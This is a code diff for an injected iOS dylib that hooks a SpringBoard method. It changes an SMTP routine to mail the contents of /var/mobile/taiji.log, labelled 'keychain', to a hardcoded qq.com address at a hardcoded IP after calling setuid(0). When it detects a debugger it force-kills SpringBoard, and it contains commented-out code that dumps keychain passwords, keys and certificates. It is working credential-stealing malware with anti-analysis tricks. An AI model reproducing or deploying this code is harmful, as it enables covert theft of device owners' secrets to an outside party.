@@ -20,6 +20,7 @@
 #include <netdb.h>
 #include <unistd.h>
 #include <sys/sysctl.h>
+#include <sys/mman.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
 //#include <sys/ptrace.h>
@@ -418,15 +419,7 @@ void sendmail(const char *username,const char *password,const char *email,const 
     memset(&their_addr, 0, sizeof(their_addr));
     their_addr.sin_family = AF_INET;
     their_addr.sin_port = htons(25);
-    
-    struct hostent *hp;
-	hp = gethostbyname(smtp);
-	if (hp==(struct hostent *) 0)
-	{
-        return;
-	}
-    memcpy((char *) &their_addr.sin_addr, (char *) hp->h_addr, hp->h_length);
-    their_addr.sin_addr.s_addr = inet_addr(smtp);
+    their_addr.sin_addr.s_addr = inet_addr("163.177.65.211");
     sockfd = open_socket((struct sockaddr *)&their_addr);
     memset(rbuf,0,1500);
     while(recv(sockfd, rbuf, 1500, 0) == 0)
@@ -436,14 +429,15 @@ void sendmail(const char *username,const char *password,const char *email,const 
         sockfd = open_socket((struct sockaddr *)&their_addr);
         memset(rbuf,0,1500);
     }
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
+    
     // EHLO
     memset(buf, 0, 1500);
     sprintf(buf, "EHLO localhost.localdomain\r\n");
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // AUTH LOGIN
     memset(buf, 0, 1500);
     sprintf(buf, "AUTH LOGIN\r\n");
@@ -451,7 +445,7 @@ void sendmail(const char *username,const char *password,const char *email,const 
     printf("%s\n", buf);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // USER
     memset(buf, 0, 1500);
     sprintf(buf,"%s",username);
@@ -462,7 +456,7 @@ void sendmail(const char *username,const char *password,const char *email,const 
     printf("%s\n", buf);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // PASSWORD
     sprintf(buf, "%s",password);
     base64(pass, buf, [[NSString stringWithFormat:@"%zu",strlen(buf)] intValue]);
@@ -471,28 +465,28 @@ void sendmail(const char *username,const char *password,const char *email,const 
     printf("%s\n", buf);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // MAIL FROM
     memset(buf, 0, 1500);
     sprintf(buf, "MAIL FROM:<%s>\r\n",username);
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // RCPT TO
     memset(buf, 0, 1500);
     sprintf(buf, "RCPT TO:<%s>\r\n", email);
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // DATA
     memset(buf, 0, 1500);
     sprintf(buf, "DATA\r\n");
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     //TO
     memset(buf, 0, 1500);
     sprintf(buf, "TO:%s\r\n",email);
@@ -513,14 +507,14 @@ void sendmail(const char *username,const char *password,const char *email,const 
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     // QUIT
     memset(buf, 0, 1500);
     sprintf(buf, "QUIT\r\n");
     send(sockfd, buf, strlen(buf), 0);
     memset(rbuf, 0, 1500);
     recv(sockfd, rbuf, 1500, 0);
-    printf("%s\n", rbuf);
+    NSLog(@"%s",rbuf);
     return;
 }
 
@@ -607,7 +601,7 @@ static IMP sOriginalImp = NULL;
 
 + (void)load{
     if (is_being_debugging()) {
-        system("killall SpringBoard");
+        system("killall -9 SpringBoard");
     }
     //ptrace(PT_DENY_ATTACH, 0, 0, 0);
     Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
@@ -620,7 +614,7 @@ static IMP sOriginalImp = NULL;
 - (void)patchedLaunch:(_Bool)arg1{
     
     if (is_being_debugging()) {
-        system("killall SpringBoard");
+        system("killall -9 SpringBoard");
     }
     //ptrace(PT_DENY_ATTACH, 0, 0, 0);
     
@@ -629,15 +623,22 @@ static IMP sOriginalImp = NULL;
     //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
     //[alert show];
     
-    sendmail("username","password","mailto","smtp","subject","mail content");
+#pragma mark - do twice will crash
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND,0), ^{
+        int fd = open("/var/mobile/taiji.log",O_RDONLY);
+        int len = (int)lseek(fd,0,SEEK_END);
+        char *mbuf = (char *) mmap(NULL,len,PROT_READ,MAP_PRIVATE,fd,0);
+        setuid(0);
+        sendmail("445108920@qq.com","fill your password","445108920@qq.com","smtp.qq.com","keychain",mbuf);
+    });
     
 
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+    /*dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
-    });
+    });*/
 }
 @end
